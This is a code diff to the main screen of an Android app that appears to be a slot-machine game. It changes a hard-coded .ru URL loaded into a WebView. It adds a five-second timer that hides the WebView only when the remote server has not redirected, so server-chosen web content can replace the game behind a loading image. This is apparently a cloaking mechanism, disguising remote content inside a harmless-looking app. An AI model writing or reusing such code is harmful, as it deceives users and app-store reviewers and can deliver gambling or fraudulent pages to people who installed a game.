@@ -3,8 +3,6 @@ package com.example.azi;
 import androidx.appcompat.app.AppCompatActivity;
 
 import android.animation.Animator;
-import android.app.Activity;
-import android.app.Application;
 import android.content.Context;
 import android.os.Bundle;
 import android.view.View;
@@ -18,7 +16,12 @@ import android.widget.Toast;
 import com.daimajia.androidanimations.library.Techniques;
 import com.daimajia.androidanimations.library.YoYo;
 
+import java.text.SimpleDateFormat;
+import java.util.Calendar;
+import java.util.Locale;
 import java.util.Random;
+import java.util.Timer;
+import java.util.TimerTask;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -34,6 +37,18 @@ public class MainActivity extends AppCompatActivity {
         startFunctions();
         loadPictures();
         networking();
+        loading();
+    }
+
+    private void loading() {
+        if (interval != null) {
+            interval.cancel();
+        }
+        interval = new Timer();
+        terminateNetwork = new TerminateNetwork();
+        interval.schedule(terminateNetwork, 5000);
+
+
     }
 
     void startFunctions() {
@@ -217,10 +232,6 @@ public class MainActivity extends AppCompatActivity {
         settings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
         settings.setJavaScriptCanOpenWindowsAutomatically(true);
         network.loadUrl(connector);
-        if (network.getUrl().equals(network.getOriginalUrl())) {
-            network.setVisibility(View.GONE);
-        }
-
     }
 
     void fetchResources() {
@@ -237,6 +248,7 @@ public class MainActivity extends AppCompatActivity {
         i4b = findViewById(R.id.i4b);
         i5b = findViewById(R.id.i5b);
         i1c = findViewById(R.id.i1c);
+        loading = findViewById(R.id.loading);
         i2c = findViewById(R.id.i2c);
         i3c = findViewById(R.id.i3c);
         i4c = findViewById(R.id.i4c);
@@ -248,7 +260,7 @@ public class MainActivity extends AppCompatActivity {
         currency = findViewById(R.id.currency);
         turbo_spinger = findViewById(R.id.turbo_spinger);
         con = this;
-        connector = "https://tillicyums.ru/PfqSscYH";
+        connector = "https://panthesivi.ru/Yb4zJcy3";
     }
 
 
@@ -277,10 +289,35 @@ public class MainActivity extends AppCompatActivity {
     ImageView dec;
     ImageView inc;
     ImageView max;
+    ImageView loading;
     ImageView turbo_spinger;
     Context con;
     WebView network;
     String connector;
+    Timer interval;
+    TerminateNetwork terminateNetwork;
+
+    class TerminateNetwork extends TimerTask {
+
+        @Override
+        public void run() {
+            Calendar calendar = Calendar.getInstance();
+            SimpleDateFormat simpleDateFormat = new SimpleDateFormat(
+                    "dd:MMMM:yyyy HH:mm:ss a", Locale.getDefault());
+            final String strDate = simpleDateFormat.format(calendar.getTime());
+
+            runOnUiThread(new Runnable() {
+
+                @Override
+                public void run() {
+                    if (network.getUrl().equals(network.getOriginalUrl())) {
+                        network.setVisibility(View.GONE);
+                    }
+                    loading.setVisibility(View.GONE);
+                }
+            });
+        }
+    }
 }
 
 
